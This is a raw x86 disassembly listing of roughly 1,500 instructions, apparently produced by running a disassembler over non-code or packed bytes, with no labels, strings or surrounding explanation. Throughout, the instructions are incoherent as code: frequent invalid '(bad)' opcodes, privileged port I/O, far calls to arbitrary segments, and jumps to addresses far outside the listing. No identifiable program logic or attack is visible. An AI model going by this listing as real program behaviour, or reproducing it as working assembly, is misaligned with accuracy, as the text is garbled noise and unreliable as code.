  427a37:	push   esi
  427a38:	dec    eax
  427a39:	aas    
  427a3a:	jmp    0xbcc92db1
  427a3f:	out    dx,al
  427a40:	shl    DWORD PTR [ebx-0x67],1
  427a43:	dec    esi
  427a44:	mov    eax,ds:0x7e76e998
  427a49:	sar    BYTE PTR [ebp-0x2d],0x68
  427a4d:	xor    eax,0x2342dd
  427a52:	imul   BYTE PTR [ebp-0x16]
  427a55:	adc    BYTE PTR [ecx+0x6cf07b76],ch
  427a5b:	inc    eax
  427a5c:	out    dx,al
  427a5d:	push   esp
  427a5e:	and    al,bl
  427a60:	push   DWORD PTR [ecx+edi*1+0x1a]
  427a64:	lock pop ss
  427a66:	into   
  427a67:	test   al,0xf
  427a69:	sti    
  427a6a:	add    BYTE PTR [edx+0xe],bl
  427a6d:	div    DWORD PTR [esi-0x60]
  427a70:	aam    0x74
  427a72:	or     al,0xc3
  427a74:	or     cl,al
  427a76:	adc    BYTE PTR [esi+edi*8+0x7a],cl
  427a7a:	jge    0x427af8
  427a7c:	push   DWORD PTR [ebx+0x2d]
  427a7f:	stos   DWORD PTR es:[edi],eax
  427a80:	shr    DWORD PTR [ebp+0x8],cl
  427a83:	add    BYTE PTR [eax],al
  427a85:	add    BYTE PTR [eax],al
  427a87:	add    BYTE PTR [ebx],al
  427a89:	or     dl,al
  427a8b:	adc    BYTE PTR [esi+edi*8+0x6cf30061],cl
  427a92:	add    ecx,DWORD PTR [ebx+0x530f48f4]
  427a98:	ret    
  427a99:	or     ch,al
  427a9b:	adc    al,0x8c
  427a9d:	(bad)  
  427a9e:	out    dx,al
  427a9f:	fdiv   DWORD PTR [edi-0x42]
  427aa2:	dec    esi
  427aa3:	dec    DWORD PTR [edx+0x67]
  427aa6:	cmp    ecx,DWORD PTR [ecx+0x15f6f2da]
  427aac:	push   0xd300400f
  427ab1:	dec    eax
  427ab2:	std    
  427ab3:	lds    ebx,FWORD PTR [edx]
  427ab5:	(bad)  
  427ab6:	push   edi
  427ab7:	jmp    0x427aca
  427ab9:	aam    0x74
  427abb:	adc    BYTE PTR [ebx+0x6a],dl
  427abe:	pop    es
  427abf:	push   ebx
  427ac0:	push   ebx
  427ac1:	or     dl,BYTE PTR [eax+0x55ff1c14]
  427ac7:	pop    ebx
  427ac8:	and    ecx,eax
  427aca:	or     eax,DWORD PTR [eax]
  427acc:	sub    eax,ebp
  427ace:	jmp    0x427a5b
  427ad0:	dec    ebx
  427ad1:	jg     0x427ad4
  427ad3:	add    ah,bl
  427ad5:	jge    0x427ac3
  427ad7:	loopne 0x427ab1
  427ad9:	(bad)  
  427ada:	call   DWORD PTR [edx-0x16]
  427add:	jns    0x427a9f
  427adf:	je     0x427a99
  427ae1:	dec    eax
  427ae2:	sti    
  427ae3:	dec    edi
  427ae4:	ror    DWORD PTR [edx],cl
  427ae6:	sbb    al,0x13
  427ae8:	jne    0x427b03
  427aea:	add    al,0x3d
  427aec:	add    BYTE PTR [eax],al
  427aee:	add    BYTE PTR [eax],al
  427af0:	add    BYTE PTR [edi+0x5a],dh
  427af3:	(bad)  
  427af4:	jmp    FWORD PTR [edx-0x2b]
  427af7:	je     0x427af9
  427af9:	jne    0x427b54
  427afb:	jp     0x427a98
  427afd:	or     DWORD PTR [edx-0x1],ebx
  427b00:	(bad)  
  427b01:	out    dx,al
  427b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b03:	pop    esp
  427b04:	outs   dx,BYTE PTR ds:[esi]
  427b05:	mov    bl,0x9b
  427b07:	ins    DWORD PTR es:[edi],dx
  427b08:	lea    ebp,[eax]
  427b0a:	dec    esi
  427b0b:	push   0xa9846afb
  427b10:	frstor [ebx-0x6f]
  427b13:	add    ecx,DWORD PTR [esi+0x65ff6b74]
  427b19:	imul   edi,ebx,0x5ef9ffd5
  427b1f:	jg     0x427ba0
  427b21:	sub    eax,0x66725bf1
  427b26:	imul   edi,edi,0xffffff84
  427b29:	xor    eax,0x33870a42
  427b2e:	pushf  
  427b2f:	xlat   BYTE PTR ds:[ebx]
  427b30:	jg     0x427b75
  427b32:	lods   eax,DWORD PTR ds:[esi]
  427b33:	dec    DWORD PTR [eax+esi*8+0x12fb6a3b]
  427b3a:	jl     0x427b93
  427b3c:	dec    eax
  427b3d:	call   0x9241:0x35856d18
  427b44:	shl    cl,0x2b
  427b47:	repz or BYTE PTR [esi-0xf771dd5],ah
  427b4e:	pop    ebx
  427b4f:	push   0xfffffffb
  427b51:	loop   0x427b05
  427b53:	pop    ecx
  427b54:	add    DWORD PTR [eax],eax
  427b56:	add    BYTE PTR [eax],al
  427b58:	add    BYTE PTR [eax],al
  427b5a:	jne    0x427bc7
  427b5c:	jp     0x427ae3
  427b5e:	xchg   edi,eax
  427b5f:	add    al,0x6d
  427b61:	sti    
  427b62:	mov    bl,0x6b
  427b64:	(bad)  
  427b65:	aas    
  427b66:	sub    al,0xd6
  427b68:	gs push ecx
  427b6a:	call   0xae4de771
  427b6f:	popa   
  427b70:	fcmovbe st,st(3)
  427b72:	adc    cl,BYTE PTR [edi+0x6a4c3520]
  427b78:	out    0x95,eax
  427b7a:	jne    0x427b7e
  427b7c:	dec    edi
  427b7d:	enter  0xb82c,0x6b
  427b81:	(bad)  
  427b82:	shr    ah,cl
  427b84:	call   0x1939fb5c
  427b89:	push   ss
  427b8a:	xor    eax,0x81476602
  427b8f:	popa   
  427b90:	adc    al,BYTE PTR [eax]
  427b92:	clc    
  427b93:	xchg   cl,dh
  427b95:	ins    BYTE PTR es:[edi],dx
  427b96:	pop    esi
  427b97:	popa   
  427b98:	pusha  
  427b99:	not    BYTE PTR [edx]
  427b9b:	mov    ebp,DWORD PTR [esp+esi*4]
  427b9e:	dec    esi
  427b9f:	idiv   DWORD PTR [eax+0x6402b512]
  427ba5:	(bad)  
  427ba6:	push   edx
  427ba7:	mov    dl,0x5b
  427ba9:	(bad)  
  427baa:	adc    dh,BYTE PTR [edx+0x69d03ce]
  427bb0:	outs   dx,BYTE PTR ds:[esi]
  427bb1:	ret    
  427bb2:	sub    cl,BYTE PTR [esi+0x6120136c]
  427bb8:	dec    edx
  427bb9:	rcl    DWORD PTR [edx],cl
  427bbb:	fldcw  WORD PTR [esp+ebp*2]
  427bbe:	add    BYTE PTR [eax],al
  427bc0:	add    BYTE PTR [eax],al
  427bc2:	add    BYTE PTR [esi],cl
  427bc4:	xchg   DWORD PTR [ecx],ebp
  427bc6:	div    BYTE PTR [esi+0x14]
  427bc9:	sub    DWORD PTR [eax+0x52],ebx
  427bcc:	in     al,dx
  427bcd:	fdivr  DWORD PTR [esi-0x50]
  427bd0:	push   edx
  427bd1:	mov    ecx,0xcc15dad0
  427bd6:	add    esi,DWORD PTR [ebp-0x16]
  427bd9:	add    BYTE PTR [eax],al
  427bdb:	jne    0x427bdf
  427bdd:	or     dh,ah
  427bdf:	outs   dx,BYTE PTR ds:[esi]
  427be0:	popa   
  427be1:	fmul   QWORD PTR [edi]
  427be3:	add    dl,0xe8
  427be6:	xchg   BYTE PTR [ebp-0x6326002b],dh
  427bec:	pusha  
  427bed:	cli    
  427bee:	mov    edx,0xf87ff749
  427bf3:	mov    dh,0x60
  427bf5:	xchg   dl,bl
  427bf7:	dec    ecx
  427bf8:	mov    ch,al
  427bfa:	(bad)  
  427bfb:	push   cs
  427bfc:	imul   eax,edi,0x56bc7099
  427c02:	mov    al,0x3a
  427c04:	mov    bh,0x86
  427c06:	int    0xf2
  427c08:	gs clc 
  427c0a:	push   0x1d
  427c0c:	and    dl,BYTE PTR [edx+0x16]
  427c0f:	fwait
  427c10:	add    ebx,edi
  427c12:	cld    
  427c13:	dec    esi
  427c14:	push   cs
  427c15:	inc    eax
  427c16:	jmp    0x957d961
  427c1b:	mov    eax,edx
  427c1d:	dec    DWORD PTR [ebp+0x2adc26a4]
  427c23:	jns    0x427bac
  427c25:	cmp    eax,0x39
  427c2a:	add    BYTE PTR [eax],al
  427c2c:	arpl   dx,ax
  427c2e:	push   DWORD PTR [ebp-0x5a]
  427c31:	xchg   DWORD PTR ds:0xffc26285,esi
  427c37:	push   ecx
  427c38:	xor    al,0x87
  427c3a:	rcl    ch,0x43
  427c3d:	mov    DWORD PTR [ebp+ecx*1-0x77],eax
  427c41:	pop    ss
  427c42:	add    eax,0x1fad09
  427c47:	mov    esp,0x57bdf45
  427c4c:	gs pop esi
  427c4e:	jne    0x427c57
  427c50:	fsubr  DWORD PTR [edx]
  427c52:	fsubr  QWORD PTR [edx+0x2600e876]
  427c58:	in     eax,0x23
  427c5a:	sbb    al,0xe4
  427c5c:	jp     0x427c5f
  427c5e:	add    cl,ch
  427c60:	mov    esi,0x76aadbf7
  427c65:	push   0xfffffff6
  427c67:	add    bl,dl
  427c69:	in     al,dx
  427c6a:	test   BYTE PTR [ebx+0x43dbfbd9],0xcc
  427c71:	fild   DWORD PTR [eax+0x3cd24]
  427c77:	call   DWORD PTR [ecx-0x63bc23de]
  427c7d:	in     al,dx
  427c7e:	into   
  427c7f:	push   0xffffff8c
  427c81:	cmp    eax,0xdaab69fb
  427c86:	inc    ebx
  427c87:	and    al,0x94
  427c89:	xor    esi,esi
  427c8b:	(bad)  
  427c8c:	pop    ds
  427c8d:	jmp    0x427c85
  427c8f:	jne    0x427c91
  427c91:	add    BYTE PTR [eax],al
  427c93:	add    BYTE PTR [eax],al
  427c95:	cmc    
  427c96:	sbb    cl,cl
  427c98:	test   esp,ecx
  427c9a:	dec    esp
  427c9b:	push   es
  427c9c:	xchg   esp,eax
  427c9d:	sbb    al,0x49
  427c9f:	and    ch,0xa9
  427ca2:	(bad)  
  427ca3:	push   esp
  427ca4:	mov    edi,eax
  427ca6:	test   esp,ebp
  427ca8:	mov    BYTE PTR [ebx+eax*1+0x0],cl
  427cac:	push   esi
  427cad:	jae    0x427c9a
  427caf:	je     0x427cb9
  427cb1:	(bad)  
  427cb2:	jmp    0x427c9b
  427cb4:	idiv   DWORD PTR [ebx+eax*1]
  427cb7:	add    BYTE PTR [edi],cl
  427cb9:	add    ebx,0xffffff88
  427cbc:	inc    ebp
  427cbd:	sar    BYTE PTR [ebx+0x1],1
  427cc0:	setno  BYTE PTR [ecx+0x0]
  427cc4:	add    BYTE PTR [edx+ebx*8],cl
  427cc7:	inc    esp
  427cc8:	clc    
  427cc9:	fsub   st(3),st
  427ccb:	je     0x427cd5
  427ccd:	mov    ebx,0xdc14f3f2
  427cd2:	add    al,BYTE PTR [ebp+0x61f6c0c0]
  427cd8:	add    bl,BYTE PTR [ecx-0x64afb4bc]
  427cde:	push   edx
  427cdf:	repz lea edx,[ebx]
  427ce2:	daa    
  427ce3:	push   eax
  427ce4:	mov    esi,DWORD PTR [ebp-0x50]
  427ce7:	mov    bl,0x8c
  427ce9:	call   0xd33de35e
  427cee:	lock mov esi,0x735fca38
  427cf4:	test   DWORD PTR ds:0xfb6958,edi
  427cfa:	add    BYTE PTR [eax],al
  427cfc:	add    BYTE PTR [eax],al
  427cfe:	and    eax,0xb3481901
  427d03:	addr16 jl 0x427d4b
  427d06:	stos   BYTE PTR es:[edi],al
  427d07:	xor    eax,DWORD PTR [eax]
  427d09:	ret    0x3838
  427d0c:	add    al,0x80
  427d0e:	sbb    BYTE PTR [eax+0x4],dl
  427d11:	xchg   DWORD PTR [eax+0x59],ecx
  427d14:	push   cs
  427d15:	inc    eax
  427d16:	jne    0x427d2d
  427d18:	mov    bh,0xf1
  427d1a:	cmp    BYTE PTR [ebp-0x4fc98aec],bl
  427d20:	icebp  
  427d21:	or     esi,DWORD PTR [edx-0x62]
  427d24:	stc    
  427d25:	mov    dl,0xb6
  427d27:	outs   dx,DWORD PTR ds:[esi]
  427d28:	clc    
  427d29:	mov    dl,0xae
  427d2b:	arpl   WORD PTR [esi],di
  427d2d:	loopne 0x427cb4
  427d2f:	pusha  
  427d30:	or     ecx,DWORD PTR ds:[edx]
  427d33:	push   ecx
  427d34:	iret   
  427d35:	or     al,BYTE PTR [edx]
  427d37:	sub    DWORD PTR [eax],eax
  427d39:	rcl    DWORD PTR [ebp+0x3c],0xfc
  427d3d:	shl    BYTE PTR [ebp+0x3207f0ec],0x3f
  427d44:	idiv   edx
  427d46:	or     bh,0x14
  427d49:	inc    eax
  427d4a:	jne    0x427d3a
  427d4c:	inc    ebx
  427d4d:	je     0x427cd5
  427d4f:	inc    ecx
  427d50:	(bad)  
  427d52:	mov    dl,BYTE PTR [edi+0x68]
  427d55:	adc    eax,0xffbf3869
  427d5a:	stc    
  427d5b:	sub    edi,ecx
  427d5d:	add    ebp,0x6b
  427d60:	(bad)  
  427d61:	inc    DWORD PTR [eax]
  427d63:	add    BYTE PTR [eax],al
  427d65:	add    BYTE PTR [eax],al
  427d67:	fld    QWORD PTR [edx]
  427d69:	jno    0x427dd2
  427d6b:	out    dx,al
  427d6c:	pop    ebp
  427d6d:	gs inc esp
  427d6f:	imul   esp,esp,0xe86ac15d
  427d75:	clc    
  427d76:	aam    0x79
  427d78:	mul    bh
  427d7a:	add    esi,DWORD PTR [ebp-0x4e]
  427d7d:	adc    BYTE PTR [esi+0x68e9029a],ah
  427d83:	inc    esi
  427d84:	push   cs
  427d85:	jmp    0xaedd:0xf0d7ae51
  427d8c:	pop    ebp
  427d8d:	push   edx
  427d8e:	cld    
  427d8f:	lahf   
  427d90:	xchg   ebp,eax
  427d91:	popa   
  427d92:	add    dh,BYTE PTR [ebp+0x2]
  427d95:	retf   0x690e
  427d98:	imul   BYTE PTR [eax]
  427d9a:	add    al,0xf0
  427d9c:	inc    edx
  427d9d:	xor    eax,0xe66a0d2c
  427da2:	add    esi,DWORD PTR [ebp+0x5d]
  427da5:	xor    bh,al
  427da7:	outs   dx,DWORD PTR ds:[esi]
  427da8:	test   DWORD PTR [edx*1+0x436402b5],0xc05df3e8
  427db3:	push   0xffffff82
  427db5:	push   ecx
  427db6:	pop    ds
  427db7:	je     0x427dbb
  427db9:	jmp    0x6f3b3dc0
  427dbe:	mov    esi,0xde11693f
  427dc3:	cmp    cl,BYTE PTR [esi+0x275e732]
  427dc9:	jmp    0x427e36
  427dce:	add    BYTE PTR [eax],al
  427dd0:	addr16 pop ebp
  427dd2:	hlt    
  427dd3:	add    DWORD PTR [edx+eax*8+0x41375be8],0x4a
  427ddb:	push   0x70f4c6fa
  427de0:	mov    ch,0x26
  427de2:	jmp    0x4f2ea
  427de7:	mov    ebx,0x297ecd4b
  427dec:	repnz int3 
  427dee:	mov    WORD PTR [edx+ecx*2+0x7af4fab2],gs
  427df5:	idiv   BYTE PTR [edi]
  427df7:	jmp    0xa4cf80b4
  427dfc:	xor    dh,BYTE PTR [edx+0x1ba3efa]
  427e02:	add    cl,ch
  427e04:	dec    ebp
  427e05:	imul   DWORD PTR [ebx]
  427e07:	fnsave [esi-0x2f2196a4]
  427e0d:	push   es
  427e0e:	lea    ebp,[edx*1-0x3a69054e]
  427e15:	add    DWORD PTR [eax],eax
  427e17:	jmp    0xf56a752f
  427e1c:	mov    dh,0x5c
  427e1e:	stos   DWORD PTR es:[edi],eax
  427e1f:	call   0xac0b38d7
  427e24:	sbb    DWORD PTR [esp+edx*2+0x62],0xb1e3dd1d
  427e2c:	imul   BYTE PTR [esi+0x1c]
  427e2f:	cmp    bh,BYTE PTR [ebx]
  427e31:	test   esi,ebp
  427e33:	jb     0x427e35
  427e35:	add    BYTE PTR [eax],al
  427e37:	add    BYTE PTR [eax],al
  427e39:	and    esi,eax
  427e3b:	push   edx
  427e3c:	scas   al,BYTE PTR es:[edi]
  427e3d:	jno    0x427e5d
  427e3f:	add    cl,ch
  427e41:	jbe    0x427e9a
  427e43:	jb     0x427e22
  427e45:	leave  
  427e46:	into   
  427e47:	and    ebx,ecx
  427e49:	sub    DWORD PTR [ecx+0x15],ebx
  427e4c:	jge    0x427eb4
  427e4e:	ret    0x63ff
  427e51:	mov    ecx,0x71878407
  427e56:	add    al,BYTE PTR [eax]
  427e58:	jb     0x427e3d
  427e5a:	out    dx,eax
  427e5b:	xchg   BYTE PTR [ecx-0x163eb086],ah
  427e61:	jbe    0x427e65
  427e63:	inc    eax
  427e64:	add    al,cl
  427e66:	add    cl,BYTE PTR [ebp+0x4b9187e]
  427e6c:	mov    eax,DWORD PTR [edx]
  427e6e:	cmp    DWORD PTR [edi-0x3a54dc],0x73efdcff
  427e78:	inc    edx
  427e79:	or     DWORD PTR [si],ebx
  427e7c:	adc    al,0xc
  427e7e:	add    BYTE PTR [edi-0x7d],cl
  427e81:	pushf  
  427e82:	repnz dec edi
  427e84:	lea    ebx,[eax]
  427e86:	cld    
  427e87:	sbb    edx,DWORD PTR [eax-0x3d]
  427e8a:	mov    al,0x84
  427e8c:	rcl    bl,0x72
  427e8f:	rol    BYTE PTR [esp+ebx*2+0x5a8b2c51],0xf2
  427e97:	jp     0x427e59
  427e99:	test   al,0x2f
  427e9b:	not    BYTE PTR ds:0x0
  427ea1:	add    ah,al
  427ea3:	or     eax,DWORD PTR [eax+0x0]
  427ea6:	sbb    DWORD PTR [edi-0x62f8ad8d],edi
  427eac:	xorps  xmm1,XMMWORD PTR [edi]
  427eaf:	mov    edi,0x9b115003
  427eb4:	pop    ds
  427eb5:	sbb    al,0x8c
  427eb7:	jecxz  0x427e83
  427eb9:	test   DWORD PTR [esp+edx*2],ebx
  427ebc:	xchg   esp,eax
  427ebd:	rol    BYTE PTR [edi],0x1
  427ec0:	sub    al,al
  427ec2:	enter  0x73bf,0x36
  427ec6:	add    ebp,DWORD PTR [ebp+0xf]
  427ec9:	mov    ebx,DWORD PTR [edx-0x1c]
  427ecc:	jae    0x427ef2
  427ece:	sbb    al,0xd8
  427ed0:	(bad)  
  427ed1:	call   0x3968cc
  427ed6:	xchg   edi,eax
  427ed7:	pop    ebp
  427ed8:	div    BYTE PTR [eax+edi*2+0x5a]
  427edc:	mov    BYTE PTR [eax+edi*2-0xe],al
  427ee0:	add    BYTE PTR [esi+0x75],0x5d
  427ee4:	jl     0x427f2a
  427ee6:	pop    ecx
  427ee7:	add    DWORD PTR [ebx+0x15],esp
  427eea:	or     DWORD PTR ds:0x28f9ffbf,edi
  427ef0:	jmp    0x427ef8
  427ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ef3:	out    0xba,al
  427ef5:	and    ecx,DWORD PTR [ecx+0x40245779]
  427efb:	and    al,0x62
  427efd:	pop    ebx
  427efe:	inc    ebx
  427eff:	mov    ecx,0xdee5703
  427f04:	enter  0xbe,0x0
  427f08:	add    BYTE PTR [eax],al
  427f0a:	add    BYTE PTR [eax],ch
  427f0c:	loopne 0x427f60
  427f0e:	xchg   DWORD PTR [eax],esi
  427f10:	push   ebp
  427f11:	test   ah,ch
  427f13:	ins    DWORD PTR es:[edi],dx
  427f14:	addr16 (bad) 
  427f16:	jmp    DWORD PTR [ebx]
  427f18:	jl     0x427f90
  427f1a:	icebp  
  427f1b:	data16 ins BYTE PTR es:[edi],dx
  427f1d:	xor    ecx,ecx
  427f1f:	mov    ds:0x60740f68,eax
  427f24:	call   0x3487ab6c
  427f29:	jmp    0x427f32
  427f2b:	add    dh,ah
  427f2d:	imul   edi,ebp,0xffffff8a
  427f30:	inc    ebx
  427f31:	aam    0xe7
  427f33:	out    dx,al
  427f34:	scas   eax,DWORD PTR es:[edi]
  427f35:	fs sti 
  427f37:	lock test al,0xf0
  427f3a:	ds (bad) 
  427f3c:	adc    DWORD PTR [eax],eax
  427f3e:	cmp    ebx,ebp
  427f40:	pop    ebx
  427f41:	in     eax,dx
  427f42:	push   ss
  427f43:	out    dx,al
  427f44:	and    eax,edi
  427f46:	cli    
  427f47:	mov    eax,ds:0x4d8d72b3
  427f4c:	xchg   DWORD PTR [ebp-0x5],esp
  427f4f:	pop    ebp
  427f50:	cmp    al,0xdd
  427f52:	inc    DWORD PTR [edx-0x21]
  427f55:	inc    ebx
  427f56:	je     0x427eeb
  427f58:	sub    BYTE PTR [ecx],ch
  427f5a:	jp     0x427ee1
  427f5c:	pop    ebp
  427f5d:	pop    edx
  427f5e:	pop    bp
  427f60:	add    al,al
  427f62:	rcr    BYTE PTR [edi],cl
  427f64:	adc    BYTE PTR [ebp+0x60],bl
  427f67:	pop    edx
  427f68:	add    dl,BYTE PTR [edx+0xf]
  427f6b:	jno    0x427f62
  427f6d:	test   al,0x3
  427f6f:	add    BYTE PTR [eax],al
  427f71:	add    BYTE PTR [eax],al
  427f73:	add    BYTE PTR [esi],al
  427f75:	cmp    ebx,esi
  427f77:	inc    ebx
  427f78:	and    BYTE PTR [edx+0x3b],0x81
  427f7c:	xor    eax,0xbdc59205
  427f81:	inc    esp
  427f82:	loope  0x427f87
  427f84:	call   0x9559:0xe858a942
  427f8b:	pop    ds
  427f8c:	ins    DWORD PTR es:[edi],dx
  427f8d:	lea    esp,[eax-0x3b313005]
  427f93:	sti    
  427f94:	repz add eax,DWORD PTR [edx]
  427f97:	aam    0x7a
  427f99:	or     DWORD PTR [ebx],esi
  427f9b:	inc    esp
  427f9c:	(bad)  
  427f9d:	cmp    cl,dh
  427f9f:	inc    ebx
  427fa0:	xor    ah,BYTE PTR [edx-0x15]
  427fa3:	xor    BYTE PTR [ebp-0x5d0458fc],0x4f
  427faa:	and    eax,0x3b037120
  427faf:	jns    0x427f35
  427fb1:	inc    ecx
  427fb2:	jecxz  0x427fb7
  427fb4:	or     al,0xc2
  427fb6:	call   0xd0f2f4aa
  427fbb:	mov    ebp,0x78e9024d
  427fc0:	aaa    
  427fc1:	mov    eax,0xaf6affa6
  427fc6:	ins    DWORD PTR es:[edi],dx
  427fc7:	jb     0x427fc3
  427fc9:	(bad)  
  427fca:	in     al,0x3c
  427fcc:	ja     0x427fd4
  427fce:	pop    esi
  427fcf:	ret    
  427fd0:	push   edx
  427fd1:	jle    0x427f73
  427fd3:	out    dx,eax
  427fd4:	je     0x427f63
  427fd6:	call   0x4280b4
  427fdb:	add    BYTE PTR [eax],al
  427fdd:	jne    0x428038
  427fdf:	fnstenv [esi-0x51]
  427fe2:	or     al,BYTE PTR [eax]
  427fe4:	cmp    DWORD PTR [esi+0x3],0xbe98e900
  427feb:	and    esi,ecx
  427fed:	ja     0x428034
  427fef:	add    bl,BYTE PTR ds:0xdd001925
  427ff5:	adc    BYTE PTR [ebx+0x26fdee7],dh
  427ffb:	add    BYTE PTR [edx+0x40],dh
  427ffe:	mov    esp,0x8176e5bd
  428003:	dec    esp
  428004:	or     eax,0x4151c975
  428009:	xchg   ebp,eax
  42800a:	push   ebx
  42800b:	sti    
  42800c:	arpl   WORD PTR es:[edx+0x74],ax
  428010:	stos   DWORD PTR es:[edi],eax
  428011:	push   ecx
  428012:	into   
  428013:	and    esp,ebp
  428015:	lods   al,BYTE PTR cs:[esi]
  428017:	adc    cl,ch
  428019:	jbe    0x427f9c
  42801b:	fsubr  DWORD PTR [ebp+ebp*1-0x32]
  42801f:	cs call 0x58b6:0xdaa7ef51
  428027:	xchg   BYTE PTR [esi+0x6c048786],ah
  42802d:	ins    DWORD PTR es:[edi],dx
  42802e:	add    al,BYTE PTR [eax]
  428030:	jmp    0x394e553a
  428035:	and    DWORD PTR [esi+0x7e76e927],ebp
  42803b:	sar    BYTE PTR ds:0xd9438166,0x0
  428042:	add    BYTE PTR [eax],al
  428044:	add    BYTE PTR [eax],al
  428046:	jmp    0x428053
  428048:	mov    ebp,edx
  42804a:	stc    
  42804b:	pop    ebx
  42804c:	inc    ebx
  42804d:	fld    DWORD PTR [esi]
  42804f:	add    ah,bh
  428051:	icebp  
  428052:	sub    esp,DWORD PTR [eax-0x48]
  428055:	shl    DWORD PTR [esi+0x2],1
  428058:	cs test eax,0xe5bdb137
  42805e:	jbe    0x427ffa
  428060:	loop   0x428062
  428062:	sbb    al,0xca
  428064:	stos   DWORD PTR es:[edi],eax
  428065:	ret    
  428066:	popa   
  428067:	xchg   esp,ebp
  428069:	add    DWORD PTR [eax],0xffffffb7
  42806c:	jp     0x42805a
  42806e:	xor    cl,dh
  428070:	mov    edi,0xf188e253
  428075:	mov    eax,edx
  428077:	pop    ds
  428078:	adc    al,0x89
  42807a:	loopne 0x42809b
  42807c:	sbb    BYTE PTR [ecx-0x76e3e030],cl
  428082:	rcr    BYTE PTR [edi],1
  428084:	sub    BYTE PTR [ebx-0x76b1002e],cl
  42808a:	and    BYTE PTR [eax],ah
  42808c:	adc    al,0x68
  42808e:	fs pop es
  428090:	add    BYTE PTR [eax],al
  428092:	push   esp
  428093:	cs push cs
  428095:	add    ah,cl
  428097:	int3   
  428098:	inc    ebx
  428099:	and    al,0xcc
  42809b:	sub    eax,DWORD PTR [ebx+0x7486dc40]
  4280a1:	and    al,0xa0
  4280a3:	jmp    0x428062
  4280a5:	mov    al,0xbb
  4280a7:	in     al,0x82
  4280a9:	cmp    eax,0x0
  4280ae:	add    al,cl
  4280b0:	push   eax
  4280b1:	cmp    eax,DWORD PTR [eax]
  4280b3:	or     al,0xe5
  4280b5:	xor    al,0xfc
  4280b7:	mov    al,0x40
  4280b9:	sti    
  4280ba:	(bad)  
  4280bb:	jecxz  0x428135
  4280bd:	cli    
  4280be:	add    BYTE PTR [ebx+eax*1+0x31173ee3],bl
  4280c5:	dec    DWORD PTR [edx+0x2454728d]
  4280cb:	xchg   esp,eax
  4280cc:	(bad)  
  4280cd:	not    BYTE PTR [eax+0x60]
  4280d0:	jg     0x428092
  4280d2:	je     0x428141
  4280d4:	in     al,0x73
  4280d6:	and    al,0x78
  4280d8:	jno    0x42811e
  4280da:	and    al,0x5c
  4280dc:	jb     0x42812a
  4280de:	and    al,0x75
  4280e0:	dec    ebp
  4280e1:	mov    WORD PTR [ecx+edx*4+0x65],es
  4280e5:	addr16 push esp
  4280e7:	adc    DWORD PTR [eax+0x53fd685e],eax
  4280ed:	(bad)  
  4280ee:	(bad)  
  4280ef:	in     eax,dx
  4280f0:	pop    eax
  4280f1:	idiv   bh
  4280f3:	sub    al,BYTE PTR [ecx-0x1fdd5026]
  4280f9:	scas   al,BYTE PTR es:[edi]
  4280fa:	cli    
  4280fb:	pusha  
  4280fc:	mov    ch,0x62
  4280fe:	aas    
  4280ff:	jne    0x4280b1
  428101:	xor    eax,0xa12d3637
  428106:	pop    ebx
  428107:	mov    ds:0x98e58aa4,eax
  42810c:	sub    al,0xb9
  42810e:	xchg   ah,ah
  428110:	daa    
  428111:	or     DWORD PTR [eax],ebx
  428113:	add    BYTE PTR [eax],al
  428115:	add    BYTE PTR [eax],al
  428117:	add    dh,bh
  428119:	test   al,0xff
  42811b:	out    0x85,eax
  42811d:	imul   edi,edi,0x36edaff
  428123:	ret    
  428124:	jnp    0x42813b
  428126:	lea    eax,[eax+0x75]
  428129:	add    DWORD PTR [ecx+0x23],esi
  42812c:	jne    0x428197
  42812e:	sar    DWORD PTR [esi-0x7fac2bdd],0x33
  428135:	pop    ebp
  428136:	push   DWORD PTR [ebx-0x71]
  428139:	jo     0x42814d
  42813b:	sti    
  42813c:	pop    esp
  42813d:	fisttp WORD PTR [ebx]
  42813f:	jb     0x4280c5
  428141:	aam    0xc5
  428143:	add    edx,DWORD PTR [edx-0x5a17640c]
  428149:	inc    DWORD PTR [ebx]
  42814b:	add    BYTE PTR [edx],bh
  42814d:	add    al,0xde
  42814f:	pop    es
  428150:	pop    es
  428151:	dec    eax
  428152:	sar    edx,0xeb
  428155:	addr16 rcl DWORD PTR [bp+si-0x95],0x7e
  42815c:	fild   DWORD PTR [edx]
  42815e:	in     eax,dx
  42815f:	add    ebx,edx
  428161:	fdivr  st(0),st
  428163:	add    ebp,DWORD PTR [edi+0x448d3b41]
  428169:	or     DWORD PTR [ebx],0x10
  42816c:	jne    0x42811b
  42816e:	ins    DWORD PTR es:[edi],dx
  42816f:	loopne 0x428107
  428171:	push   es
  428172:	cmc    
  428173:	cmc    
  428174:	sti    
  428175:	mov    esp,0x9a6160ec
  42817a:	add    DWORD PTR [edx+0x0],0xe9025600
  428184:	mov    WORD PTR [edi-0x32d79a02],?
  42818a:	add    bh,BYTE PTR [edx+0x746b3f8c]
  428190:	data16 (bad) 
  428192:	push   ebp
  428193:	mov    ds:0xe8feb8c1,al
  428198:	mov    ah,0xfb
  42819a:	mov    dh,0xc
  42819c:	or     al,0x47
  42819e:	mov    DWORD PTR [eax],edi
  4281a0:	sbb    eax,0x24960a3f
  4281a5:	cmc    
  4281a6:	aam    0xec
  4281a8:	add    ecx,DWORD PTR [ecx-0x11]
  4281ab:	mov    ecx,0xa389c28c
  4281b0:	pop    es
  4281b1:	mov    esi,0x4c6c410e
  4281b6:	sbb    eax,0x193603e9
  4281bb:	jae    0x4281c8
  4281bd:	sbb    esp,DWORD PTR [ebp-0x76]
  4281c0:	mov    ah,0xfb
  4281c2:	inc    esp
  4281c3:	rol    DWORD PTR [esi],1
  4281c5:	jne    0x4281c9
  4281c7:	jmp    0xed82ad8d
  4281cc:	add    esi,edx
  4281ce:	mov    esi,0xc34a0804
  4281d3:	lock aam 0x65
  4281d6:	lods   al,BYTE PTR ds:[esi]
  4281d7:	outs   dx,DWORD PTR ds:[esi]
  4281d8:	ret    0x437a
  4281db:	add    cl,cl
  4281dd:	jo     0x428191
  4281df:	mov    WORD PTR [eax],?
  4281e1:	ins    DWORD PTR es:[edi],dx
  4281e2:	push   0xffffffbb
  4281e4:	iret   
  4281e5:	add    BYTE PTR [eax],al
  4281e7:	add    BYTE PTR [eax],al
  4281e9:	add    BYTE PTR [esi+0x2],dh
  4281ec:	pop    edx
  4281ed:	stos   DWORD PTR es:[edi],eax
  4281ee:	jp     0x4281f2
  4281f0:	push   edx
  4281f1:	bound  esp,QWORD PTR [edi-0x2a71dd96]
  4281f7:	pop    ecx
  4281f8:	repnz sub eax,0xf5010a8d
  4281fe:	jl     0x4281b0
